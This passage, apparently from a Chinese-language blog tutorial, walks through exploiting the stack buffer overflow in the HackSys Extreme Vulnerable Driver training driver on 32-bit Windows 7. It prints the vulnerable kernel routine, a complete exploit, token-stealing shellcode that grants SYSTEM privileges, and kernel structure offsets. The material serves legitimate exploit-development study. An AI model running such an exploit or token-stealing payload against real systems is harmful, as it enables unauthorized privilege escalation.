class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BufferOverflowStack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ALLOC_PRAGMA</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> alloc_text(PAGE, TriggerBufferOverflowStack)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> alloc_text(PAGE, BufferOverflowStackIoctlHandler)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// ALLOC_PRAGMA</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Trigger the buffer overflow in Stack Vulnerability</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;UserBuffer&quot;&gt;The pointer to user mode buffer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Size&quot;&gt;Size of the user mode buffer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;</span></span><br><span class="line">__declspec(safebuffers)</span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">TriggerBufferOverflowStack</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PVOID UserBuffer,</span></span><br><span class="line"><span class="params">    _In_ SIZE_T Size</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    ULONG KernelBuffer[BUFFER_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Verify if the buffer resides in user mode</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        ProbeForRead(UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer), (ULONG)__alignof(UCHAR));</span><br><span class="line"></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, Size);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, &amp;KernelBuffer);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is passing a size</span></span><br><span class="line">        <span class="comment">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span></span><br><span class="line">        <span class="comment">// there will be no overflow</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is passing the user supplied size directly to</span></span><br><span class="line">        <span class="comment">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span></span><br><span class="line">        <span class="comment">// equal to the size of KernelBuffer</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Buffer Overflow Stack Ioctl Handler</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Irp&quot;&gt;The pointer to IRP&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;IrpSp&quot;&gt;The pointer to IO_STACK_LOCATION structure&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;</span></span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">BufferOverflowStackIoctlHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PIRP Irp,</span></span><br><span class="line"><span class="params">    _In_ PIO_STACK_LOCATION IrpSp</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    SIZE_T Size = <span class="number">0</span>;</span><br><span class="line">    PVOID UserBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    UNREFERENCED_PARAMETER(Irp);</span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    UserBuffer = IrpSp-&gt;Parameters.DeviceIoControl.Type3InputBuffer;</span><br><span class="line">    Size = IrpSp-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (UserBuffer)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = TriggerBufferOverflowStack(UserBuffer, Size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>UNREFERENCED_PARAMETER</code>用于告诉编译器,这个参数没有使用是有意为之,不要发出警告</p>
<p><code>PAGED_CODE</code>用于标记代码运行在分页内存中</p>
<p><code>ProbeForRead</code>是windows内核编程用于验证用户模式提供的缓冲区是否可读</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ProbeForRead</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_ <span class="type">const</span> <span class="keyword">volatile</span> VOID *Address,</span></span><br><span class="line"><span class="params">  _In_ SIZE_T              Length,</span></span><br><span class="line"><span class="params">  _In_ ULONG               Alignment</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p><code>RtlCopyMemory</code> 是 Windows 内核模式编程中的一个函数，用于将数据从源内存区域复制到目标内存区域,相当于用户态的<code>memcpy</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">RtlCopyMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">  _Out_       <span class="type">void</span>*       Destination,</span></span><br><span class="line"><span class="params">  _In_  <span class="type">const</span> <span class="type">void</span>*       Source,</span></span><br><span class="line"><span class="params">  _In_        SIZE_T      Length</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>这个漏洞还是很明显的,内核从用户态读取内存但是长度却由用户指定,于是存在栈溢出</p>
<p>用ida看一下kernelbuffer的缓冲区长度</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_144444.png" alt=""></p>
<p>kernelbuffer到覆盖eip需要<code>0x81C+4</code>个字节</p>
<p>是的,就是这么一个在用户态下最基本的漏洞现在出现在内核中</p>
<p>那么看HEVD给出的exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;StackOverflow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">StackOverflowThread</span><span class="params">(LPVOID Parameter)</span> &#123;</span><br><span class="line">    HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line">    ULONG BytesReturned;</span><br><span class="line">    PVOID MemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line">    PULONG UserModeBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    LPCSTR FileName = (LPCSTR)DEVICE_NAME;</span><br><span class="line">    PVOID EopPayload = &amp;TokenStealingPayloadWin7;</span><br><span class="line">    SIZE_T UserModeBufferSize = (BUFFER_SIZE + RET_OVERWRITE) * <span class="keyword">sizeof</span>(ULONG);</span><br><span class="line"></span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="comment">// Get the device handle</span></span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Getting Device Driver Handle\n&quot;</span>);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Device Name: %s\n&quot;</span>, FileName);</span><br><span class="line"></span><br><span class="line">        hFile = GetDeviceHandle(FileName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">            DEBUG_ERROR(<span class="string">&quot;\t\t[-] Failed Getting Device Handle: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t[+] Device Handle: 0x%X\n&quot;</span>, hFile);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Setting Up Vulnerability Stage\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Allocating Memory For Buffer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(),</span><br><span class="line">                                           HEAP_ZERO_MEMORY,</span><br><span class="line">                                           UserModeBufferSize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!UserModeBuffer) &#123;</span><br><span class="line">            DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed To Allocate Memory: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t\t[+] Memory Allocated: 0x%p\n&quot;</span>, UserModeBuffer);</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t\t[+] Allocation Size: 0x%X\n&quot;</span>, UserModeBufferSize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Preparing Buffer Memory Layout\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">        MemoryAddress = (PVOID)(((ULONG)UserModeBuffer + UserModeBufferSize) - <span class="keyword">sizeof</span>(ULONG));</span><br><span class="line">        *(PULONG)MemoryAddress = (ULONG)EopPayload;</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] RET Value: 0x%p\n&quot;</span>, *(PULONG)MemoryAddress);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] RET Address: 0x%p\n&quot;</span>, MemoryAddress);</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] EoP Payload: 0x%p\n&quot;</span>, EopPayload);</span><br><span class="line"></span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Triggering Kernel Stack Overflow\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        OutputDebugString(<span class="string">&quot;****************Kernel Mode****************\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        DeviceIoControl(hFile,</span><br><span class="line">                        HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">                        (LPVOID)UserModeBuffer,</span><br><span class="line">                        (DWORD)UserModeBufferSize,</span><br><span class="line">                        <span class="literal">NULL</span>,</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        &amp;BytesReturned,</span><br><span class="line">                        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        OutputDebugString(<span class="string">&quot;****************Kernel Mode****************\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)UserModeBuffer);</span><br><span class="line"></span><br><span class="line">        UserModeBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t[-] Exception: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与Linux下的内核利用相同,首先我们要做的就是获取这个设备的句柄</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE <span class="title function_">GetDeviceHandle</span><span class="params">(LPCSTR FileName)</span> &#123;</span><br><span class="line">    HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    hFile = CreateFile(FileName,</span><br><span class="line">                       GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">                       FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">                       <span class="literal">NULL</span>,</span><br><span class="line">                       OPEN_EXISTING,</span><br><span class="line">                       FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">                       <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hFile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设备名字的开头需要是<code>\\.\</code>代表这是本地的一个设备,这是命名约定</p>
<p>然后分配一块内存用于存储我们的payload,长度也就是<code>0x81C+4+4</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">MemoryAddress = (PVOID)(((ULONG)UserModeBuffer + UserModeBufferSize) - <span class="keyword">sizeof</span>(ULONG));</span><br><span class="line">*(PULONG)MemoryAddress = (ULONG)EopPayload;</span><br></pre></td></tr></table></figure>
<p>在windows7_32中并没有smep这样的保护限制,所以我们可以直接在用户态写下提权的shellcode,然后在内核态下跳转到执行</p>
<p>使用DeviIoControl进行触发,DeviIoControl的参数就会被使用IRP包装并传递给驱动设备</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DeviceIoControl(hFile,</span><br><span class="line">                HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">                (LPVOID)UserModeBuffer,</span><br><span class="line">                (DWORD)UserModeBufferSize,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                &amp;BytesReturned,</span><br><span class="line">                <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>回过头来看提权的shellcode</p>
<p>EopPayload实际上就是TokenStealingPayloadWin7函数的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">VOID TokenStealingPayloadWin7() &#123;</span><br><span class="line">    // Importance of Kernel Recovery</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad                               ; Save registers state</span><br><span class="line"></span><br><span class="line">        ; Start of Token Stealing Stub</span><br><span class="line">        xor eax, eax                         ; Set ZERO</span><br><span class="line">        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">                                             ; _KTHREAD is located at FS:[0x124]</span><br><span class="line"></span><br><span class="line">        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process</span><br><span class="line"></span><br><span class="line">        mov ecx, eax                         ; Copy current process _EPROCESS structure</span><br><span class="line"></span><br><span class="line">        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4</span><br><span class="line"></span><br><span class="line">        SearchSystemPID:</span><br><span class="line">            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">            sub eax, FLINK_OFFSET</span><br><span class="line">            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId</span><br><span class="line">            jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token</span><br><span class="line">                                             ; with SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">        ; End of Token Stealing Stub</span><br><span class="line"></span><br><span class="line">        popad                                ; Restore registers state</span><br><span class="line"></span><br><span class="line">        ; Kernel Recovery Stub</span><br><span class="line">        xor eax, eax                         ; Set NTSTATUS SUCCEESS</span><br><span class="line">        add esp, 12                          ; Fix the stack</span><br><span class="line">        pop ebp                              ; Restore saved EBP</span><br><span class="line">        ret 8                                ; Return cleanly</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一段shellcode做的就是循环遍历进程,并将系统system进程的token替换给当前进程</p>
<p>在 Windows 操作系统中，<code>FS</code> 寄存器在用户态和内核态指向不同的内存区域</p>
<ul>
<li>用户态：<code>FS</code> 寄存器指向 <strong>线程环境块（TEB，Thread Environment Block）</strong></li>
<li>内核态：<code>FS</code> 寄存器指向 <strong>处理器控制区域（KPCR，Kernel Processor Control Region）</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>: kd&gt; dt nt!_KPCR</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x000</span> Used_ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Used_StackBase   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> Spare2           : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> TssCopy          : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> ContextSwitches  : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> SetMemberCopy    : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Used_Self        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> SelfPcr          : Ptr32 _KPCR</span><br><span class="line">   +<span class="number">0x020</span> Prcb             : Ptr32 _KPRCB</span><br><span class="line">   +<span class="number">0x024</span> Irql             : UChar</span><br><span class="line">   +<span class="number">0x028</span> IRR              : Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> IrrActive        : Uint4B</span><br><span class="line">   +<span class="number">0x030</span> IDR              : Uint4B</span><br><span class="line">   +<span class="number">0x034</span> KdVersionBlock   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x038</span> IDT              : Ptr32 _KIDTENTRY</span><br><span class="line">   +<span class="number">0x03c</span> GDT              : Ptr32 _KGDTENTRY</span><br><span class="line">   +<span class="number">0x040</span> TSS              : Ptr32 _KTSS</span><br><span class="line">   +<span class="number">0x044</span> MajorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x046</span> MinorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x048</span> SetMember        : Uint4B</span><br><span class="line">   +<span class="number">0x04c</span> StallScaleFactor : Uint4B</span><br><span class="line">   +<span class="number">0x050</span> SpareUnused      : UChar</span><br><span class="line">   +<span class="number">0x051</span> Number           : UChar</span><br><span class="line">   +<span class="number">0x052</span> Spare0           : UChar</span><br><span class="line">   +<span class="number">0x053</span> SecondLevelCacheAssociativity : UChar</span><br><span class="line">   +<span class="number">0x054</span> VdmAlert         : Uint4B</span><br><span class="line">   +<span class="number">0x058</span> KernelReserved   : [<span class="number">14</span>] Uint4B</span><br><span class="line">   +<span class="number">0x090</span> SecondLevelCacheSize : Uint4B</span><br><span class="line">   +<span class="number">0x094</span> HalReserved      : [<span class="number">16</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0d4</span> InterruptMode    : Uint4B</span><br><span class="line">   +<span class="number">0x0d8</span> Spare1           : UChar</span><br><span class="line">   +<span class="number">0x0dc</span> KernelReserved2  : [<span class="number">17</span>] Uint4B</span><br><span class="line">   +<span class="number">0x120</span> PrcbData         : _KPRCB</span><br><span class="line">       </span><br><span class="line"><span class="number">3</span>: kd&gt; dt _KPRCB</span><br><span class="line">nt!_KPRCB</span><br><span class="line">   +<span class="number">0x000</span> MinorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> MajorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> CurrentThread    : Ptr32 _KTHREAD</span><br></pre></td></tr></table></figure>
<p>首先从KPCR的0x124偏移处获取CurrentThread</p>
<p>再从CurrentThread的0x50偏移处获取Eprocess的地址,并保存此时的Eprocess地址</p>
<p>windows的system的进程ID一般都是0x4</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_151441.png" alt=""></p>
<p>在_EPROCESS的0xb8处有一个ActiveProcessLinks字段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _EPROCESS</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">   +<span class="number">0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   +<span class="number">0x098</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x0a0</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x0a8</span> ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x0b0</span> RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +<span class="number">0x0b4</span> UniqueProcessId  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0b8</span> ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x0c0</span> ProcessQuotaUsage : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> ProcessQuotaPeak : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0d0</span> CommitCharge     : Uint4B</span><br><span class="line">   +<span class="number">0x0d4</span> QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">   +<span class="number">0x0d8</span> CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK</span><br><span class="line">   +<span class="number">0x0dc</span> PeakVirtualSize  : Uint4B</span><br><span class="line">   +<span class="number">0x0e0</span> VirtualSize      : Uint4B</span><br><span class="line">   +<span class="number">0x0e4</span> SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x0ec</span> DebugPort        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortData : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortValue : Uint4B</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortState : Pos <span class="number">0</span>, <span class="number">3</span> Bits</span><br><span class="line">   +<span class="number">0x0f4</span> ObjectTable      : Ptr32 _HANDLE_TABLE</span><br><span class="line">   +<span class="number">0x0f8</span> Token            : _EX_FAST_REF</span><br></pre></td></tr></table></figure>
<p>用于链接所有的进程结构</p>
